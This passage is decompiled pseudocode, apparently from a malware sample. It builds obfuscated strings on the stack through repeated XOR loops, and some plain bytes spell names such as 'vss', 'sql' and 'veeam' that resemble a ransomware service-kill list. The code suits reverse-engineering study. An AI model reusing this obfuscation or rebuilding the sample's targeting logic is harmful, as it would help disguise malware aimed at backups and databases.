LOBYTE(STACK[0x6B8]) = v90 ^ 0x47;\n  v94 = LOBYTE(STACK[0x6BE]) ^ 0x1C;\n  LOBYTE(STACK[0x6BF]) = LOBYTE(STACK[0x6BE]) ^ 0x1E;\n  LOBYTE(STACK[0x6C0]) = v94;\n  v95 = STACK[0x6BE];\n  v96 = LOBYTE(STACK[0x6BE]) ^ 1;\n  LOBYTE(STACK[0x6B9]) = v92;\n  LOBYTE(STACK[0x6BA]) = v93;\n  LOBYTE(STACK[0x6C5]) = v96;\n  LOBYTE(STACK[0x6BD]) = 0;\n  LOBYTE(STACK[0x6C7]) = 0;\n  LOBYTE(STACK[0x6C1]) = v95 ^ 1;\n  LOBYTE(STACK[0x6C2]) = v95 ^ 0xC;\n  LOBYTE(STACK[0x6C3]) = v95 ^ 9;\n  LOBYTE(STACK[0x6C6]) = v95 ^ 0x1D;\n  LOBYTE(STACK[0x5CF]) = 0;\n  LOBYTE(STACK[0x6BD]) = 0;\n  LOBYTE(STACK[0x6C4]) = v95 ^ 5;\n  LOBYTE(STACK[0x6C7]) = 0;\n  LOBYTE(STACK[0x6F2]) = 38;\n  v97 = LOBYTE(STACK[0x6F2]) ^ 0x53;\n  LOBYTE(STACK[0x6F3]) = LOBYTE(STACK[0x6F2]) ^ 0x65;\n  LOBYTE(STACK[0x6F4]) = v97;\n  v98 = STACK[0x6F2];\n  v99 = LOBYTE(STACK[0x6F2]) ^ 0x55;\n  LOBYTE(STACK[0x6F9]) = LOBYTE(STACK[0x6F2]) ^ 0x50;\n  v100 = v98 ^ 0x43;\n  LOBYTE(STACK[0x6FA]) = v98 ^ 0x43;\n  v101 = v98 ^ 0x54;\n  LOBYTE(STACK[0x5AB]) = 77;\n  LOBYTE(STACK[0x6FB]) = v98 ^ 0x54;\n  LOBYTE(STACK[0x6F5]) = v98 ^ 0x4A;\n  LOBYTE(STACK[0x5AC]) = LOBYTE(STACK[0x5AB]) ^ 0x1F;\n  v102 = STACK[0x5AB];\n  v103 = LOBYTE(STACK[0x5AB]) ^ 0x19;\n  LOBYTE(STACK[0x6F6]) = v99;\n  LOBYTE(STACK[0x6F7]) = v100;\n  LOBYTE(STACK[0x6F8]) = v101;\n  v104 = v102 ^ 0x3E;\n  LOBYTE(STACK[0x5AD]) = v103;\n  LOBYTE(STACK[0x654]) = 108;\n  LOBYTE(STACK[0x5AE]) = v102 ^ 0x1B;\n  v105 = v102 ^ 0x2C;\n  LOBYTE(STACK[0x5B0]) = v102 ^ 0x2E;\n  v106 = LOBYTE(STACK[0x654]) ^ 0x1D;\n  LOBYTE(STACK[0x5B2]) = LOBYTE(STACK[0x5AB]) ^ 0x23;\n  v107 = LOBYTE(STACK[0x654]) ^ 0x1F;\n  LOBYTE(STACK[0x5AF]) = v104;\n  LOBYTE(STACK[0x5B1]) = v105;\n  LOBYTE(STACK[0x656]) = v106;\n  v108 = STACK[0x654];\n  LOBYTE(STACK[0x655]) = v107;\n  LOBYTE(STACK[0x65F]) = 0;\n  LOBYTE(STACK[0x6FC]) = 0;\n  LOBYTE(STACK[0x5B3]) = 0;\n  LOBYTE(STACK[0x6FC]) = 0;\n  LOBYTE(STACK[0x5B3]) = 0;\n  LOBYTE(STACK[0x657]) = v108;\n  LOBYTE(STACK[0x658]) = v108 ^ 0xE;\n  LOBYTE(STACK[0x659]) = v108 ^ 0x1E;\n  LOBYTE(STACK[0x65A]) = v108 ^ 3;\n  LOBYTE(STACK[0x65B]) = v108 ^ 0x1B;\n  LOBYTE(STACK[0x6C8]) = 6;\n  LOBYTE(STACK[0x65C]) = v108 ^ 0x1F;\n  LOBYTE(STACK[0x65D]) = v108 ^ 9;\n  LOBYTE(STACK[0x65E]) = v108 ^ 0x1E;\n  v109 = LOBYTE(STACK[0x6C8]) ^ 0x57;\n  LOBYTE(STACK[0x6C9]) = LOBYTE(STACK[0x6C8]) ^ 0x55;\n  LOBYTE(STACK[0x6CA]) = v109;\n  v110 = STACK[0x6C8];\n  v111 = LOBYTE(STACK[0x6C8]) ^ 0x4A;\n  LOBYTE(STACK[0x6D1]) = 0;\n  LOBYTE(STACK[0x6CF]) = v111;\n  LOBYTE(STACK[0x6CB]) = v110 ^ 0x4A;\n  LOBYTE(STACK[0x6CD]) = v110 ^ 0x42;\n  v112 = v110 ^ 0x56;\n  LOBYTE(STACK[0x65F]) = 0;\n  LOBYTE(STACK[0x6CC]) = v110 ^ 0x47;\n  v113 = 66;\n  LOBYTE(STACK[0x6CE]) = v110 ^ 0x4E;\n  v114 = 0;\n  LOBYTE(STACK[0x6D0]) = v112;\n  LOBYTE(STACK[0x6D1]) = 0;\n  STACK[0x771] = 184554306;\n  STACK[0x775] = 655430150;\n  strcpy((char *)&STACK[0x779], \"04+!'\");\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x772] + v114++) ^= v113;\n    if ( v114 >= 0xC )\n      break;\n    v113 = STACK[0x771];\n  }\n  v115 = 0;\n  LOBYTE(STACK[0x77E]) = 0;\n  *(_OWORD *)&STACK[0x9AC] = xmmword_4246C0;\n  STACK[0x9BC] = 224737312;\n  LOWORD(STACK[0x9C0]) = 6152;\n  LOBYTE(STACK[0x9C2]) = 0;\n  do\n    *((_BYTE *)&STACK[0x9AD] + v115++) ^= LOBYTE(STACK[0x9AC]);\n  while ( v115 < 0x15 );\n  v116 = 0;\n  LOBYTE(STACK[0x9C2]) = 0;\n  *(_OWORD *)&STACK[0xA08] = xmmword_424D00;\n  STACK[0xA18] = 8354163;\n  do\n    *((_BYTE *)&STACK[0xA09] + v116++) ^= LOBYTE(STACK[0xA08]);\n  while ( v116 < 0x12 );\n  LOBYTE(STACK[0x61D]) = 121;\n  v117 = LOBYTE(STACK[0x61D]) ^ 8;\n  LOBYTE(STACK[0x61E]) = LOBYTE(STACK[0x61D]) ^ 0xA;\n  LOBYTE(STACK[0x61F]) = v117;\n  v118 = STACK[0x61D];\n  LOBYTE(STACK[0x624]) = LOBYTE(STACK[0x61D]) ^ 0xD;\n  LOBYTE(STACK[0x625]) = v118 ^ 0x1C;\n  LOBYTE(STACK[0x620]) = v118 ^ 0x15;\n  LOBYTE(STACK[0x626]) = v118 ^ 0xB;\n  LOBYTE(STACK[0x5E7]) = 59;\n  LOBYTE(STACK[0x621]) = v118 ^ 0xE;\n  LOBYTE(STACK[0x5E8]) = LOBYTE(STACK[0x5E7]) ^ 0x56;\n  v119 = STACK[0x5E7];\n  v120 = LOBYTE(STACK[0x5E7]) ^ 0x56;\n  LOBYTE(STACK[0x622]) = v118 ^ 0xB;\n  LOBYTE(STACK[0x623]) = v118 ^ 0x10;\n  LOBYTE(STACK[0x5BD]) = 14;\n  LOBYTE(STACK[0x5E9]) = v119 ^ 0x48;\n  LOBYTE(STACK[0x5EA]) = v120;\n  LOBYTE(STACK[0x5EB]) = v119 ^ 0x5F;\n  LOBYTE(STACK[0x5EE]) = LOBYTE(STACK[0x5E7]) ^ 0x4D;\n  LOBYTE(STACK[0x5ED]) = v119 ^ 0x49;\n  LOBYTE(STACK[0x5EC]) = v119 ^ 0x48;\n  LOBYTE(STACK[0x5BE]) = LOBYTE(STACK[0x5BD]) ^ 0x7A;\n  v121 = STACK[0x5BD];\n  v122 = LOBYTE(STACK[0x5BD]) ^ 0x61;\n  LOBYTE(STACK[0x627]) = 0;\n  LOBYTE(STACK[0x5EF]) = 0;\n  LOBYTE(STACK[0xA1B]) = 0;\n  LOBYTE(STACK[0x627]) = 0;\n  LOBYTE(STACK[0x5EF]) = 0;\n  LOBYTE(STACK[0x5C5]) = 0;\n  LOBYTE(STACK[0x5BF]) = v122;\n  LOBYTE(STACK[0x5C0]) = v121 ^ 0x63;\n  LOBYTE(STACK[0x5C1]) = v121 ^ 0x6D;\n  LOBYTE(STACK[0x5C2]) = v121 ^ 0x6F;\n  v123 = v121 ^ 0x7A;\n  LOBYTE(STACK[0x5C5]) = 0;\n  v124 = 81;\n  v125 = LOBYTE(STACK[0x5BD]) ^ 0x38;\n  v126 = 0;\n  LOBYTE(STACK[0x5C3]) = v123;\n  LOBYTE(STACK[0x5C4]) = v125;\n  strcpy((char *)&STACK[0x814], \"Q+9$5>?670?6($\");\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x815] + v126++) ^= v124;\n    if ( v126 >= 0xD )\n      break;\n    v124 = STACK[0x814];\n  }\n  v127 = 0;\n  LOBYTE(STACK[0x822]) = 0;\n  *(_OWORD *)&STACK[0x9C3] = xmmword_424510;\n  STACK[0x9D3] = 252840220;\n  strcpy((char *)&STACK[0x9D7], \"KI\");\n  do\n    *((_BYTE *)&STACK[0x9C4] + v127++) ^= LOBYTE(STACK[0x9C3]);\n  while ( v127 < 0x15 );\n  v128 = 0;\n  LOBYTE(STACK[0x9D9]) = 0;\n  *(_OWORD *)&STACK[0xC28] = xmmword_424B40;\n  LOWORD(STACK[0xC38]) = 64;\n  do\n    *((_BYTE *)&STACK[0xC29] + v128++) ^= LOBYTE(STACK[0xC28]);\n  while ( v128 < 0x10 );\n  LOBYTE(STACK[0x5D5]) = 23;\n  LOBYTE(STACK[0x5D6]) = LOBYTE(STACK[0x5D5]) ^ 0x73;\n  v129 = STACK[0x5D5];\n  v130 = LOBYTE(STACK[0x5D5]) ^ 0x75;\n  LOBYTE(STACK[0x670]) = 98;\n  LOBYTE(STACK[0x5D7]) = v130;\n  LOBYTE(STACK[0x5D8]) = v129 ^ 0x64;\n  LOBYTE(STACK[0x5DA]) = v129 ^ 0x61;\n  LOBYTE(STACK[0x5D9]) = v129 ^ 0x65;\n  LOBYTE(STACK[0x5DC]) = LOBYTE(STACK[0x5D5]) ^ 0x25;\n  LOBYTE(STACK[0x5DB]) = v129 ^ 0x26;\n  v131 = LOBYTE(STACK[0x670]) ^ 6;\n  LOBYTE(STACK[0x677]) = 0;\n  LOBYTE(STACK[0x671]) = v131;\n  v132 = STACK[0x670];\n  v133 = STACK[0x670];\n  LOBYTE(STACK[0x5DD]) = 0;\n  LOBYTE(STACK[0x672]) = v133;\n  LOBYTE(STACK[0x675]) = v132 ^ 5;\n  LOBYTE(STACK[0xC39]) = 0;\n  LOBYTE(STACK[0x5DD]) = 0;\n  LOBYTE(STACK[0x673]) = v132 ^ 7;\n  v134 = 0;\n  LOBYTE(STACK[0x674]) = v132 ^ 0xC;\n  LOBYTE(STACK[0x676]) = v132 ^ 0x5A;\n  LOBYTE(STACK[0x677]) = 0;\n  strcpy((char *)&STACK[0xA1C], \"x5++)4\\\\51;*7+7>,[[/1<\");\n  do\n    *((_BYTE *)&STACK[0xA1D] + v134++) ^= LOBYTE(STACK[0xA1C]);\n  while ( v134 < 0x14 );\n  v135 = 0;\n  LOBYTE(STACK[0xA31]) = 0;\n  *(_OWORD *)&STACK[0xB40] = xmmword_424C90;\n  STACK[0xB50] = 6645351;\n  do\n    *((_BYTE *)&STACK[0xB41] + v135++) ^= LOBYTE(STACK[0xB40]);\n  while ( v135 < 0x12 );\n  v136 = 0;\n  LOBYTE(STACK[0xB53]) = 0;\n  *(_OWORD *)&STACK[0x9DA] = xmmword_424710;\n  strcpy((char *)&STACK[0x9EA], \")4JHIJ\");\n  do\n    *((_BYTE *)&STACK[0x9DB] + v136++) ^= LOBYTE(STACK[0x9DA]);\n  while ( v136 < 0x15 );\n  LOBYTE(STACK[0x731]) = 77;\n  v137 = LOBYTE(STACK[0x731]) ^ 0x1C;\n  LOBYTE(STACK[0x732]) = LOBYTE(STACK[0x731]) ^ 0x1E;\n  LOBYTE(STACK[0x733]) = v137;\n  v138 = STACK[0x731];\n  v139 = LOBYTE(STACK[0x731]) ^ 1;\n  v140 = LOBYTE(STACK[0x731]) ^ 0xF;\n  LOBYTE(STACK[0x738]) = LOBYTE(STACK[0x731]) ^ 0x3A;\n  v141 = v138 ^ 0x22;\n  LOBYTE(STACK[0x739]) = v138 ^ 0x3E;\n  LOBYTE(STACK[0x73A]) = v138 ^ 0x28;\n  v142 = v138 ^ 0x3F;\n  LOBYTE(STACK[0x6FD]) = 25;\n  LOBYTE(STACK[0x73B]) = v138 ^ 0x3F;\n  v143 = LOBYTE(STACK[0x6FD]) ^ 0x48;\n  LOBYTE(STACK[0x6FE]) = LOBYTE(STACK[0x6FD]) ^ 0x4A;\n  LOBYTE(STACK[0x6FF]) = v143;\n  v144 = STACK[0x6FD];\n  vars3 = 109;\n  LOBYTE(STACK[0x736]) = v142;\n  LOBYTE(STACK[0x704]) = v144 ^ 0x6D;\n  LOBYTE(STACK[0x734]) = v139;\n  LOBYTE(STACK[0x735]) = v140;\n  LOBYTE(STACK[0x737]) = v141;\n  LOBYTE(STACK[0x705]) = v144 ^ 0x7C;\n  v145 = v144 ^ 0x4E;\n  LOBYTE(STACK[0x73C]) = 0;\n  v146 = v144 ^ 0x70;\n  LOBYTE(STACK[0x707]) = 0;\n  v147 = v144 ^ 0x6B;\n  LOBYTE(STACK[0x700]) = v144 ^ 0x55;\n  LOBYTE(STACK[0x702]) = v144 ^ 0x6B;\n  v148 = 70;\n  LOBYTE(STACK[0x9F0]) = 0;\n  v149 = 0;\n  LOBYTE(STACK[0x73C]) = 0;\n  LOBYTE(STACK[0x701]) = v145;\n  LOBYTE(STACK[0x703]) = v146;\n  LOBYTE(STACK[0x706]) = v147;\n  LOBYTE(STACK[0x707]) = 0;\n  STACK[0x832] = 892272710;\n  STACK[0x836] = 824779822;\n  STACK[0x83A] = 356453162;\n  LOWORD(STACK[0x83E]) = 2583;\n  LOBYTE(STACK[0x840]) = 0;\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x833] + v149++) ^= v148;\n    if ( v149 >= 0xD )\n      break;\n    v148 = STACK[0x832];\n  }\n  v150 = 0;\n  LOBYTE(STACK[0x840]) = 0;\n  *(_OWORD *)&STACK[0xA48] = xmmword_424E90;\n  strcpy((char *)&STACK[0xA58], \"\\b\\b|bo\");\n  do\n    *((_BYTE *)&STACK[0xA49] + v150++) ^= LOBYTE(STACK[0xA48]);\n  while ( v150 < 0x14 );\n  LOBYTE(STACK[0x5F9]) = 116;\n  LOBYTE(STACK[0x5FA]) = LOBYTE(STACK[0x5F9]) ^ 0x39;\n  v151 = STACK[0x5F9];\n  v152 = LOBYTE(STACK[0x5F9]) ^ 0xD;\n  LOBYTE(STACK[0x601]) = 0;\n  v153 = v151 ^ 0x25;\n  LOBYTE(STACK[0x5FB]) = v152;\n  LOBYTE(STACK[0xA5D]) = 0;\n  LOBYTE(STACK[0x5FE]) = v151 ^ 0x38;\n  v154 = v151 ^ 0x41;\n  LOBYTE(STACK[0x5FC]) = v151 ^ 0x27;\n  v155 = LOBYTE(STACK[0x5F9]) ^ 0x43;\n  v156 = 0;\n  LOBYTE(STACK[0x5FD]) = v153;\n  LOBYTE(STACK[0x5FF]) = v154;\n  LOBYTE(STACK[0x600]) = v155;\n  LOBYTE(STACK[0x601]) = 0;\n  *(_OWORD *)&STACK[0x94D] = xmmword_424B20;\n  strcpy((char *)&STACK[0x95D], \"_[\\\\MY[F\");\n  do\n    *((_BYTE *)&STACK[0x94E] + v156++) ^= LOBYTE(STACK[0x94D]);\n  while ( v156 < 0x16 );\n  v157 = 0;\n  LOBYTE(STACK[0x964]) = 0;\n  *(_OWORD *)&STACK[0x97D] = xmmword_424580;\n  STACK[0x98D] = 453777669;\n  STACK[0x991] = 5855576;\n  do\n    *((_BYTE *)&STACK[0x97E] + v157++) ^= LOBYTE(STACK[0x97D]);\n  while ( v157 < 0x16 );\n  v158 = 0;\n  LOBYTE(STACK[0x994]) = 0;\n  *(_OWORD *)&STACK[0x902] = xmmword_424760;\n  strcpy((char *)&STACK[0x912], \"<\\\"'.*-<(*7\");\n  do\n    *((_BYTE *)&STACK[0x903] + v158++) ^= LOBYTE(STACK[0x902]);\n  while ( v158 < 0x19 );\n  v159 = 0;\n  LOBYTE(STACK[0x91C]) = 0;\n  *(_OWORD *)&STACK[0xC15] = xmmword_424E50;\n  strcpy((char *)&STACK[0xC25], \"sq\");\n  do\n    *((_BYTE *)&STACK[0xC16] + v159++) ^= LOBYTE(STACK[0xC15]);\n  while ( v159 < 0x11 );\n  v160 = 0;\n  LOBYTE(STACK[0xC27]) = 0;\n  strcpy((char *)&STACK[0x995], \"\\bE[[YD,EAKZG[GN\\\\++[[MM\");\n  do\n    *((_BYTE *)&STACK[0x996] + v160++) ^= LOBYTE(STACK[0x995]);\n  while ( v160 < 0x15 );\n  v161 = 0;\n  LOBYTE(STACK[0x9AB]) = 0;\n  strcpy((char *)&STACK[0xA71], \"#nppro\\apapnlmjwlqjmd\");\n  do\n    *((_BYTE *)&STACK[0xA72] + v161++) ^= LOBYTE(STACK[0xA71]);\n  while ( v161 < 0x13 );\n  v162 = 0;\n  LOBYTE(STACK[0xA85]) = 0;\n  strcpy((char *)&STACK[0xC3A], \"m >><!I>%,?(=\\\"$#9\");\n  do\n    *((_BYTE *)&STACK[0xC3B] + v162++) ^= LOBYTE(STACK[0xC3A]);\n  while ( v162 < 0x10 );\n  v163 = 0;\n  LOBYTE(STACK[0xC4B]) = 0;\n  *(_OWORD *)&STACK[0x870] = xmmword_424650;\n  strcpy((char *)&STACK[0x880], \"M:+:$&' =&; '.\");\n  do\n    *((_BYTE *)&STACK[0x871] + v163++) ^= LOBYTE(STACK[0x870]);\n  while ( v163 < 0x1D );\n  v164 = 0;\n  LOBYTE(STACK[0x88E]) = 0;\n  *(_OWORD *)&STACK[0x8CA] = xmmword_424D40;\n  strcpy((char *)&STACK[0x8DA], \";LW^MZOPVQK\");\n  do\n    *((_BYTE *)&STACK[0x8CB] + v164++) ^= LOBYTE(STACK[0x8CA]);\n  while ( v164 < 0x1A );\n  v165 = 0;\n  LOBYTE(STACK[0x8E5]) = 0;\n  strcpy((char *)&STACK[0x965], \"\\x1BHJWZ|~uo?HYHVTUROTIRU\\\\\");\n  do\n    *((_BYTE *)&STACK[0x966] + v165++) ^= LOBYTE(STACK[0x965]);\n  while ( v165 < 0x16 );\n  v166 = 0;\n  LOBYTE(STACK[0x97C]) = 0;\n  *(_OWORD *)&STACK[0xA86] = xmmword_424DE0;\n  strcpy((char *)&STACK[0xA96], \"hnis\");\n  do\n    *((_BYTE *)&STACK[0xA87] + v166++) ^= LOBYTE(STACK[0xA86]);\n  while ( v166 < 0x13 );\n  LOBYTE(STACK[0xA9A]) = 0;\n  v167 = 91;\n  STACK[0x78B] = 488180315;\n  v168 = 0;\n  STACK[0x78F] = 691931160;\n  strcpy((char *)&STACK[0x793], \"-28>\");\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x78C] + v168++) ^= v167;\n    if ( v168 >= 0xB )\n      break;\n    v167 = STACK[0x78B];\n  }\n  LOBYTE(STACK[0x6DC]) = 33;\n  LOBYTE(STACK[0x808]) = 66;\n  LOBYTE(STACK[0x806]) = 76;\n  LOBYTE(STACK[0x807]) = 81;\n  LOBYTE(STACK[0x809]) = 86;\n  LOBYTE(STACK[0x80C]) = 0;\n  v169 = LOBYTE(STACK[0x6DC]) ^ 0x4E;\n  LOBYTE(STACK[0x6DD]) = LOBYTE(STACK[0x6DC]) ^ 0x78;\n  LOBYTE(STACK[0x6DE]) = v169;\n  v170 = STACK[0x6DC];\n  v171 = LOBYTE(STACK[0x6DC]) ^ 0x4A;\n  LOBYTE(STACK[0x80A]) = 83;\n  LOBYTE(STACK[0x6E3]) = v171;\n  LOBYTE(STACK[0x80B]) = 83;\n  LOBYTE(STACK[0x6E4]) = v170 ^ 0x54;\n  LOBYTE(STACK[0x6E0]) = v170 ^ 0x63;\n  LOBYTE(STACK[0x6E5]) = v170 ^ 0x51;\n  LOBYTE(STACK[0x6E2]) = v170 ^ 0x42;\n  LOBYTE(STACK[0x6DF]) = v170 ^ 0x4E;\n  LOBYTE(STACK[0x6E1]) = v170 ^ 0x40;\n  LOBYTE(STACK[0x6E6]) = 0;\n  LOBYTE(STACK[0x724]) = 0;\n  LOBYTE(STACK[0x797]) = 0;\n  LOBYTE(STACK[0x71F]) = 89;\n  LOBYTE(STACK[0x722]) = 73;\n  LOBYTE(STACK[0x80C]) = 0;\n  LOBYTE(STACK[0x720]) = 111;\n  LOBYTE(STACK[0x6E6]) = 0;\n  LOBYTE(STACK[0x721]) = 111;\n  LOBYTE(STACK[0x71E]) = 40;\n  LOBYTE(STACK[0x723]) = 84;\n  LOBYTE(STACK[0x724]) = 0;\n  LOBYTE(STACK[0x755]) = 83;\n  LOBYTE(STACK[0x759]) = 0;\n  LOBYTE(STACK[0x756]) = 118;\n  LOBYTE(STACK[0x678]) = 85;\n  LOBYTE(STACK[0x757]) = 115;\n  LOBYTE(STACK[0x758]) = 115;\n  LOBYTE(STACK[0x784]) = 0;\n  LOBYTE(STACK[0x5D0]) = 113;\n  LOBYTE(STACK[0x5D2]) = 113;\n  LOBYTE(STACK[0x7B8]) = 0;\n  LOBYTE(STACK[0x5D1]) = 115;\n  LOBYTE(STACK[0x77F]) = 4;\n  LOBYTE(STACK[0x67F]) = 0;\n  LOBYTE(STACK[0x5D3]) = 108;\n  LOBYTE(STACK[0x7B2]) = 66;\n  LOBYTE(STACK[0x759]) = 0;\n  LOBYTE(STACK[0x780]) = 115;\n  LOBYTE(STACK[0x5D4]) = 0;\n  LOBYTE(STACK[0x781]) = 118;\n  LOBYTE(STACK[0x784]) = 0;\n  LOBYTE(STACK[0x782]) = 99;\n  LOBYTE(STACK[0x7B8]) = 0;\n  LOBYTE(STACK[0x783]) = 36;\n  LOBYTE(STACK[0x67F]) = 0;\n  LOBYTE(STACK[0x7B3]) = 77;\n  LOBYTE(STACK[0x680]) = 14;\n  LOBYTE(STACK[0x7B4]) = 83;\n  LOBYTE(STACK[0x7B5]) = 83;\n  LOBYTE(STACK[0x7B6]) = 81;\n  v172 = LOBYTE(STACK[0x678]) ^ 0x18;\n  LOBYTE(STACK[0x7B7]) = 76;\n  LOBYTE(STACK[0x679]) = v172;\n  v173 = STACK[0x678];\n  v174 = LOBYTE(STACK[0x678]) ^ 6;\n  v175 = LOBYTE(STACK[0x678]) ^ 4;\n  LOBYTE(STACK[0x67A]) = v174;\n  LOBYTE(STACK[0x67B]) = v174;\n  LOBYTE(STACK[0x67C]) = v175;\n  LOBYTE(STACK[0x67D]) = v173 ^ 0x19;\n  LOBYTE(STACK[0x67E]) = v173 ^ 0x71;\n  LOBYTE(STACK[0x681]) = LOBYTE(STACK[0x680]) ^ 0x63;\n  v176 = STACK[0x680];\n  v177 = LOBYTE(STACK[0x680]) ^ 0x6B;\n  LOBYTE(STACK[0x688]) = 124;\n  LOBYTE(STACK[0x682]) = v177;\n  LOBYTE(STACK[0x683]) = v176 ^ 0x63;\n  LOBYTE(STACK[0x684]) = v176 ^ 0x7A;\n  LOBYTE(STACK[0x685]) = v176 ^ 0x6F;\n  LOBYTE(STACK[0x686]) = v176 ^ 0x7D;\n  LOBYTE(STACK[0x689]) = LOBYTE(STACK[0x688]) ^ 0x11;\n  v178 = STACK[0x688];\n  v179 = LOBYTE(STACK[0x688]) ^ 0x19;\n  LOBYTE(STACK[0x690]) = 78;\n  LOBYTE(STACK[0x68A]) = v179;\n  LOBYTE(STACK[0x68B]) = v178 ^ 0xC;\n  LOBYTE(STACK[0x68C]) = v178 ^ 0x13;\n  LOBYTE(STACK[0x687]) = 0;\n  LOBYTE(STACK[0x68D]) = v178 ^ 0x1F;\n  LOBYTE(STACK[0x68F]) = 0;\n  LOBYTE(STACK[0x68E]) = v178 ^ 0xF;\n  LOBYTE(STACK[0x697]) = 0;\n  LOBYTE(STACK[0x691]) = LOBYTE(STACK[0x690]) ^ 0x3D;\n  v180 = STACK[0x690];\n  v181 = LOBYTE(STACK[0x690]) ^ 0x21;\n  LOBYTE(STACK[0x7F7]) = 0;\n  LOBYTE(STACK[0x692]) = v181;\n  LOBYTE(STACK[0x693]) = v180 ^ 0x3E;\n  LOBYTE(STACK[0x696]) = v180 ^ 0x3D;\n  LOBYTE(STACK[0x695]) = v180 ^ 0x21;\n  LOBYTE(STACK[0x687]) = 0;\n  LOBYTE(STACK[0x694]) = v180 ^ 0x26;\n  LOBYTE(STACK[0x68F]) = 0;\n  LOBYTE(STACK[0x697]) = 0;\n  LOBYTE(STACK[0x7F1]) = 24;\n  LOBYTE(STACK[0x7F7]) = 0;\n  LOBYTE(STACK[0x698]) = 111;\n  LOBYTE(STACK[0x7F2]) = 118;\n  LOBYTE(STACK[0x7F3]) = 101;\n  LOBYTE(STACK[0x7F4]) = 101;\n  LOBYTE(STACK[0x7F5]) = 97;\n  LOBYTE(STACK[0x7F6]) = 109;\n  LOBYTE(STACK[0x699]) = LOBYTE(STACK[0x698]) ^ 0xD;\n  v182 = STACK[0x698];\n  v183 = LOBYTE(STACK[0x698]) ^ 0xC;\n  LOBYTE(STACK[0x69F]) = 0;\n  LOBYTE(STACK[0x69B]) = v183;\n  LOBYTE(STACK[0x69A]) = v182 ^ 0xE;\n  LOBYTE(STACK[0x69D]) = v182 ^ 0x1A;\n  LOBYTE(STACK[0x69E]) = v182 ^ 0x1F;\n  LOBYTE(STACK[0x7F0]) = 0;\n  LOBYTE(STACK[0x69C]) = v182 ^ 4;\n  LOBYTE(STACK[0x69F]) = 0;\n  LOBYTE(STACK[0x7EA]) = 125;\n  LOBYTE(STACK[0x7F0]) = 0;\n  STACK[0x7F8] = 1146503698;\n  strcpy((char *)&STACK[0x7FC], \"TAAw`d{qw\");\n  LOBYTE(STACK[0x7ED]) = 100;\n  LOBYTE(STACK[0x7EC]) = 101;\n  LOBYTE(STACK[0x7EF]) = 103;\n  LOBYTE(STACK[0x7EB]) = 98;\n  LOBYTE(STACK[0x7EE]) = 98;\n  v184 = 18;\n  v185 = 0;\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x7F9] + v185++) ^= v184;\n    if ( v185 >= 0xC )\n      break;\n    v184 = STACK[0x7F8];\n  }\n  v186 = 0;\n  LOBYTE(STACK[0x805]) = 0;\n  *(_OWORD *)&STACK[0x9F1] = xmmword_424630;\n  STACK[0xA01] = 201399815;\n  LOWORD(STACK[0xA05]) = 6669;\n  LOBYTE(STACK[0xA07]) = 0;\n  do\n    *((_BYTE *)&STACK[0x9F2] + v186++) ^= LOBYTE(STACK[0x9F1]);\n  while ( v186 < 0x15 );\n  v187 = 0;\n  LOBYTE(STACK[0xA07]) = 0;\n  *(_OWORD *)&STACK[0x8E6] = xmmword_424E40;\n  strcpy((char *)&STACK[0x8F6], \"Ommkbk|oza|\");\n  do\n    *((_BYTE *)&STACK[0x8E7] + v187++) ^= LOBYTE(STACK[0x8E6]);\n  while ( v187 < 0x1A );\n  v188 = 0;\n  LOBYTE(STACK[0x901]) = 0;\n  *(_OWORD *)&STACK[0x91D] = xmmword_424D30;\n  strcpy((char *)&STACK[0x92D], \"[kvnj|k\");\n  do\n    *((_BYTE *)&STACK[0x91E] + v188++) ^= LOBYTE(STACK[0x91D]);\n  while ( v188 < 0x16 );\n  v189 = 0;\n  LOBYTE(STACK[0x934]) = 0;\n  *(_OWORD *)&STACK[0x88F] = xmmword_424450;\n  STACK[0x89F] = 76045;\n  STACK[0x8A3] = 20382989;\n  STACK[0x8A7] = 118297110;\n  LOWORD(STACK[0x8AB]) = 1;\n  do\n    *((_BYTE *)&STACK[0x890] + v189++) ^= LOBYTE(STACK[0x88F]);\n  while ( v189 < 0x1C );\n  v190 = 0;\n  LOBYTE(STACK[0x8AC]) = 0;\n  *(_OWORD *)&STACK[0xA9B] = xmmword_424430;\n  STACK[0xAAB] = 218497295;\n  LOBYTE(STACK[0xAAF]) = 0;\n  do\n    *((_BYTE *)&STACK[0xA9C] + v190++) ^= LOBYTE(STACK[0xA9B]);\n  while ( v190 < 0x13 );\n  v191 = 0;\n  LOBYTE(STACK[0xAAF]) = 0;\n  *(_OWORD *)&STACK[0x8AD] = xmmword_424440;\n  STACK[0x8BD] = 235212037;\n  STACK[0x8C1] = 302330644;\n  STACK[0x8C5] = 84085014;\n  LOBYTE(STACK[0x8C9]) = 0;\n  do\n    *((_BYTE *)&STACK[0x8AE] + v191++) ^= LOBYTE(STACK[0x8AD]);\n  while ( v191 < 0x1B );\n  v192 = 0;\n  LOBYTE(STACK[0x8C9]) = 0;\n  strcpy((char *)&STACK[0xA32], \"!c@BJTQdYDBsqbrDSWHBD\");\n  do\n    *((_BYTE *)&STACK[0xA33] + v192++) ^= LOBYTE(STACK[0xA32]);\n  while ( v192 < 0x14 );\n  LOBYTE(STACK[0x5F0]) = 22;\n  LOBYTE(STACK[0x5F1]) = LOBYTE(STACK[0x5F0]) ^ 0x5B;\n  v193 = STACK[0x5F0];\n  LOBYTE(STACK[0x5F2]) = LOBYTE(STACK[0x5F0]) ^ 0x40;\n  LOBYTE(STACK[0x6E7]) = 86;\n  LOBYTE(STACK[0x5F4]) = v193 ^ 0x64;\n  LOBYTE(STACK[0x5F3]) = v193 ^ 0x57;\n  v194 = v193 ^ 0x79;\n  LOBYTE(STACK[0x5F5]) = v193 ^ 0x7B;\n  LOBYTE(STACK[0x5F7]) = LOBYTE(STACK[0x5F0]) ^ 0x64;\n  LOBYTE(STACK[0x6F1]) = 0;\n  v195 = STACK[0x6E7];\n  LOBYTE(STACK[0x6E8]) = LOBYTE(STACK[0x6E7]) ^ 0x1B;\n  vars3a = 36;\n  LOBYTE(STACK[0x6E9]) = v195;\n  v196 = STACK[0x6E7];\n  v197 = LOBYTE(STACK[0x6E7]) ^ 0x24;\n  LOBYTE(STACK[0x5F6]) = v194;\n  LOBYTE(STACK[0x6EE]) = v197;\n  LOBYTE(STACK[0x6EF]) = v196 ^ 0x60;\n  v198 = v196 ^ 0x24;\n  v199 = v196 ^ 0x39;\n  LOBYTE(STACK[0x5F8]) = 0;\n  v200 = v196 ^ 0x62;\n  